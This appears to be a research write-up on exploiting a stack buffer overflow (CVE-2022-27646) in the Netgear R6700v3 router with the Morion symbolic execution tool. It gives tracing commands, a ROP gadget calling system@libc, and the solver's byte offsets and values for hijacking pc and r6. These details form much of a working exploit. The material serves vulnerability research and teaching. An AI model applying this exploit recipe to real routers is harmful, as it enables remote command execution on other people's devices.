# Exploiting a Stack Buffer Overflow (CVE-2022-27646) on the Netgear R6700v3 with the Help of Symbolic Execution
## Morion Usage
--------------------------------------------------------------------------------
### Tracing
- R6700v3:
    ```
    ./circled.sh
    ```
- Morion:
    ```
    cp circled.init.yaml circled.yaml; gdb-multiarch -q -x circled.gdb
    ```
### Symbolic Execution
- Morion:
    ```
    morion_control_hijacker circled.yaml
    ```
## Exploitation Strategy
--------------------------------------------------------------------------------
- Symbolic execution shows that we have full control over registers `pc` and `r4-r11`.
- Find a code snippet (gadget) that calls the `system@libc` function and allows
  us to set the `r0` register (address of system command to execute).
  ```
  rop --grep "94a0"
  [...CUT...]
  0x0000c9ac : add r0, r4, r0 ; add r1, r4, r1 ; bl #0x9878 ; mov r0, r6 ; bl #0x94a0 ; mov r0, r6 ; bl #0x9854 ; mov r0, r7 ; add sp, sp, #0x10 ; pop {r4, r5, r6, r7, r8, sb, sl, pc}
  [...CUT...]
  ```
  - Candiate: `mov r0, r6; bl #0x94a0;` at address `0xc9b8`
  - Note: The above candidate code snippet is simple to achieve code execution, however
  does not smootly return and will therefore crash the targeted process.
- Generate exploit:
  - Make register `pc` become `0xc9b8` (address of `system@libc` gadget)
  - Make register `r6` become `0xbeffc114+34` (address within targeted stack buffer - constant since no ASLR)
    - Start address of targeted stack buffer: `0xbeffc114`
    - First 34 bytes (an MD5 sum plus `b"\n\x00"`) of targeted stack buffer are not symbolic (i.e. we do not control)
  ```
  from pprint import pprint
  ast = ctx.getAstContext()
  pc = ctx.getRegisterAst(ctx.registers.pc)
  r6 = ctx.getRegisterAst(ctx.registers.r6)
  pprint(ctx.getModel(ast.land([pc == 0xc9b8, r6 == 0xbeffc114+34])))
  {
    368: 0xbeffc284 (MODEL:fgets@libc:s+368):8 = 0x36,
    369: 0xbeffc285 (MODEL:fgets@libc:s+369):8 = 0xc1,
    370: 0xbeffc286 (MODEL:fgets@libc:s+370):8 = 0xff,
    371: 0xbeffc287 (MODEL:fgets@libc:s+371):8 = 0xbe,
    392: 0xbeffc29c (MODEL:fgets@libc:s+392):8 = 0xb8,
    393: 0xbeffc29d (MODEL:fgets@libc:s+393):8 = 0xc9,
    394: 0xbeffc29e (MODEL:fgets@libc:s+394):8 = 0x0,
    395: 0xbeffc29f (MODEL:fgets@libc:s+395):8 = 0x0
  }
  ```
- Put command string at adddress `0xbeffc114+34`

## Benefits of Using Symbolic Execution
--------------------------------------------------------------------------------
### Pros
- We learn about the vulnerability capabilities
  - What registers and memory areas we control and how
### Cons
- Semantic function modelling is hard, but required (here e.g. for `sscanf`)